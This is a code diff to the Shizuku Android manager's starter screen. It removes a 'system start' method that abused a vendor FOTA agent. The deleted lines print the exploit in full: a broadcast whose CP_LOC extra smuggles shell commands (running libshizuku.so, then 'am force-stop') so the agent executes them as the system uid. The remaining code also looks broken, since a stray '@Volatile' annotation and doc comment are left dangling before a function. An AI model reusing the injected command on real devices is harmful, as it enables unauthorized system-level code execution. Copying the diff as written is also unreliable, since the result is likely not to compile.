@@ -1,14 +1,12 @@
 package moe.shizuku.manager.starter
 
 import android.app.Application
-import android.content.ActivityNotFoundException
 import android.content.BroadcastReceiver
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
-import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.util.Log
@@ -48,17 +46,6 @@ import rikka.lifecycle.Resource
 import rikka.lifecycle.Status
 
 private class NotRootedException: Exception()
-
-/**
- * The agent the system start abuses. It is not shipped with this app: whoever needs it
- * installs it, and whether it lands as the system uid is the difference between the
- * payload running as uid 1000 and the starter refusing it.
- */
-private const val FOTA_AGENT_PACKAGE = "com.sdet.fotaagent"
-
-/** How many times the agent is told to run the payload, and how far apart. */
-private const val FOTA_ATTEMPTS = 6
-private const val FOTA_ATTEMPT_INTERVAL_MS = 700L
 
 /**
  * How the system start asks the payload to report how far it got.
@@ -141,52 +128,9 @@ class StarterActivity : AppBarActivity() {
             binding.text1.text = output
         }
 
-        viewModel.agentStopped = { agentWasStopped }
-
-        // The payload's own report, while this screen is the one waiting for it. Exported
-        // because the sender is another app's process, and filtered to one action so nothing
-        // else of this app's traffic is in scope. Registered the platform way rather than
-        // through ContextCompat, whose flagged form needs a newer androidx than this app
-        // builds against.
-        val stageReceiver = object : BroadcastReceiver() {
-            override fun onReceive(context: Context, intent: Intent) {
-                val stage = intent.getStringExtra(STAGE_EXTRA) ?: return
-                viewModel.reportPayloadStage(stage)
-            }
-        }
-        val stageFilter = IntentFilter(STAGE_ACTION)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(stageReceiver, stageFilter, Context.RECEIVER_EXPORTED)
-        } else {
-            @Suppress("UnspecifiedRegisterReceiverFlag")
-            registerReceiver(stageReceiver, stageFilter)
-        }
-        payloadStageReceiver = stageReceiver
-    }
-
-    /** The payload's report arrives only while a system start is waiting. */
-    private var payloadStageReceiver: BroadcastReceiver? = null
-
-    override fun onDestroy() {
-        payloadStageReceiver?.let { runCatching { unregisterReceiver(it) } }
-        payloadStageReceiver = null
-        super.onDestroy()
     }
 
     private var hasStarted = false
-
-    /**
-     * Whether this activity came back to the front while a system start was waiting. The
-     * payload ends by stopping the agent, and the agent's activity is what covered this one,
-     * so coming back means the payload ran: the one thing that separates "the agent never
-     * acted" from "the starter or the server failed", and it needs no logcat to see.
-     */
-    private var agentWasStopped = false
-
-    override fun onResume() {
-        super.onResume()
-        if (viewModel.exploitSent) agentWasStopped = true
-    }
 
     override fun onWindowFocusChanged(hasFocus: Boolean) {
         super.onWindowFocusChanged(hasFocus)
@@ -253,14 +197,6 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
         return null
     }
 
-    /** Set once the agent has been told to run the payload. */
-    @Volatile
-    var exploitSent = false
-        private set
-
-    /** Set by the activity: whether the agent vanished while a start was waiting. */
-    var agentStopped: (() -> Boolean)? = null
-
     private val handler = CoroutineExceptionHandler { _, throwable ->
         ShizukuStateMachine.update()
         log(error = throwable)
@@ -289,8 +225,7 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
             // service nobody asked for only hides that.
             val waiting = when {
                 root -> { startRoot(); true }
-                isSystem && systemCustom -> { startSystemCustom(); true }
-                isSystem -> startSys()
+                isSystem -> { startSystemCustom(); true }
                 else -> { AdbStarter.startAdb(appContext, port, { log(it) }); true }
             }
             try {
@@ -310,126 +245,11 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
                             "\n"
                     )
                 }
-                log(
-                    if (agentStopped?.invoke() == true) {
-                        "the agent was stopped while this start was waiting, which is the " +
-                            "payload's last step: the payload ran, so what failed is the " +
-                            "starter or the server it starts\n"
-                    } else {
-                        "the agent is still running, so it did not act on the command: the " +
-                            "payload never ran\n"
-                    }
-                )
                 throw e
             }
         }
     }
 
-    /**
-     * Launches the Shizuku server under the system UID (1000) by abusing a
-     * device-specific privilege escalation. This only works on devices that ship
-     * the vulnerable component, and is opt-in via the "System start method"
-     * setting.
-     */
-    /**
-     * What the device offers before anything is sent, in the activity's own log. On a device
-     * where the agent runs the payload, the starter's output belongs to the agent and cannot
-     * be read from here, so the few facts this side can see are worth stating: whether the
-     * agent is there, which uid it has, and whether it is the one whose payload a system-uid
-     * start depends on.
-     */
-    private fun agentReport(): String = try {
-        val pm = appContext.packageManager
-        val info = pm.getPackageInfo(FOTA_AGENT_PACKAGE, PackageManager.GET_ACTIVITIES)
-        val uid = info.applicationInfo?.uid ?: -1
-        val hasMain = info.activities?.any { it.name == "$FOTA_AGENT_PACKAGE.Main" } == true
-        val verdict = when {
-            uid == 1000 -> "system uid, the payload will run as the system uid"
-            uid >= 10000 -> "an ordinary app uid, so the payload will run as one and the server refuses it"
-            else -> "uid $uid, which the server may or may not accept"
-        }
-        "agent: installed, uid $uid ($verdict), Main activity ${if (hasMain) "present" else "missing"}"
-    } catch (e: PackageManager.NameNotFoundException) {
-        "agent: not installed"
-    }
-
-    private suspend fun startSys(): Boolean {
-        log("Starting with system...\n")
-        log(agentReport())
-
-        return withContext(Dispatchers.IO) {
-            try {
-                appContext.startActivity(
-                    Intent().apply {
-                        setClassName(FOTA_AGENT_PACKAGE, "$FOTA_AGENT_PACKAGE.Main")
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    }
-                )
-
-                // Both stages come before the starter that they bracket, and the force stop
-                // stays last: it is the reason the later sends of this command find no
-                // receiver, and it has to run after everything this attempt wants to say.
-                fun stage(value: String) =
-                    "am broadcast -a $STAGE_ACTION --es $STAGE_EXTRA $value"
-
-                val exploit = Intent("$FOTA_AGENT_PACKAGE.intent.CP_FILE").apply {
-                    putExtra("CP_FILE", "/data")
-                    putExtra(
-                        "CP_LOC",
-                        "; ${stage(STAGE_AT_SHELL)}" +
-                            "; " + appContext.applicationInfo.nativeLibraryDir + "/libshizuku.so" +
-                            "; ${stage(STAGE_AFTER_STARTER)}" +
-                            "; am force-stop com.sdet.fotaagent"
-                    )
-                }
-
-                // Several times, and not only for luck. The agent registers the receiver
-                // that acts on this when its activity starts, and a single send a second
-                // later is a race against that: on a device where the activity is still
-                // coming up, the one send lands nowhere and the start looks like a timeout
-                // with nothing to show for it. Repeats cost nothing when the first lands
-                // because the payload stops the agent as its last step, which leaves the
-                // later sends without a receiver.
-                for (attempt in 0 until FOTA_ATTEMPTS) {
-                    if (attempt > 0) delay(FOTA_ATTEMPT_INTERVAL_MS)
-                    appContext.sendBroadcast(exploit)
-                    exploitSent = true
-                    log("sent the agent command (attempt ${attempt + 1} of $FOTA_ATTEMPTS)\n")
-
-                    // And stop as soon as the agent has acted. Every further send runs the
-                    // payload again, and every run stops the server the previous one started,
-                    // so a manager can be handed a binder and have it taken away again before
-                    // it notices: the repeats are only there for the race against the agent's
-                    // receiver being registered, and that race is over the moment it answers.
-                    if (payloadSeen) {
-                        log("the agent acted, so no further commands are sent\n")
-                        break
-                    }
-                }
-                true
-            } catch (e: ActivityNotFoundException) {
-                // The exploit only exists where the device ships the component it abuses,
-                // and a phone that no longer does has nothing to start: say which component
-                // is missing and which method does not need it, instead of reporting a
-                // success that never happened and then waiting for it.
-                val message = appContext.getString(R.string.start_failed_system_no_exploit)
-                log(message)
-                withContext(Dispatchers.Main) { StartStatusReporter.failed(message) }
-                false
-            } catch (e: Throwable) {
-                log("Start system failed!", e)
-                false
-            }
-        }
-    }
-
-    /**
-     * The instruction path for the system start: this app has no privilege of its own, so
-     * it says what to run and waits for the service to appear. Whatever can launch a
-     * process as a privileged uid - the user's own exploit, an automation, a root shell -
-     * runs the executable this app ships, and the wait is the same one the other methods
-     * use.
-     */
     private suspend fun startSystemCustom() {
         // Two forms of the same thing, because which one works depends on the shell the
         // command is run in: the run-time lookup needs permission to ask the package
@@ -492,18 +312,6 @@ class ViewModel(application: Application) : AndroidViewModel(application) {
 
     /** Set as soon as the payload's shell reports anything at all. */
     @Volatile
-    var payloadSeen = false
-        private set
-
-    /**
-     * A stage the payload's own shell reported. Which of these arrived, and which was last,
-     * says how far the command we handed the agent got, without depending on a log file that
-     * may be missing for reasons on either side of the process boundary.
-     */
-    fun reportPayloadStage(stage: String) {
-        payloadSeen = true
-        log("the payload's shell reached: $stage\n")
-    }
 
     private fun log(line: String? = null, error: Throwable? = null) {
         line?.let { sb.appendLine(it) }
